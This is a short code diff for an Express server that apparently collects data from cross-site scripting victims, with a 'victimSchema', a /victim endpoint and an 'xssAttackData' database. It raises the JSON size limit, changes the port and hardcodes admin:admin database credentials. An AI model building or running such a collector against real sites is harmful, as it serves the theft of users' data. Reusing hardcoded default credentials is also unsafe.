@@ -5,10 +5,10 @@ import cors from "cors";
 const app = express();
 
 app.use(cors());
-app.use(express.json());
+app.use(express.json({ limit: "10mb" }));
 
 await mongoose.connect(
-  "mongodb://admin:admin@localhost/xssAttackData?authSource=admin"
+  "mongodb://admin:admin@localhost/xssAttackData?authSource=admin",
 );
 
 const victimSchema = new mongoose.Schema({
@@ -37,4 +37,4 @@ app.post("/victim", async (req, res) => {
 });
 
 // Start server
-app.listen(8000, () => console.log("Server running on http://localhost:8000"));
+app.listen(8080, () => console.log("Server running on http://localhost:8080"));
